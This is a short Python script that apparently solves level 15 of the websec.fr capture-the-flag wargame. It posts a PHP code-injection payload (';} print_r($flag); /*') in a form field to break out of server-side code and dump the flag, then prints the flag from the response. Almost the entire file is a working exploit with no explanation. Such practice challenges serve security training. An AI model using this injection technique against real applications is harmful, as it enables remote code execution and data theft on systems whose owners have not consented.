import requests
from requests import *

url = 'http://websec.fr/level15/index.php'

data = {
    'c' : ';} print_r($flag); /*',
    'submit' : 'Submit'
}

r = post(url , data=data)
pos = r.text.find('WEBSEC{')
while (True):
    txt = r.text[pos]
    print(txt , end='')
    if (txt == '}'):
        print()
        break

    pos += 1
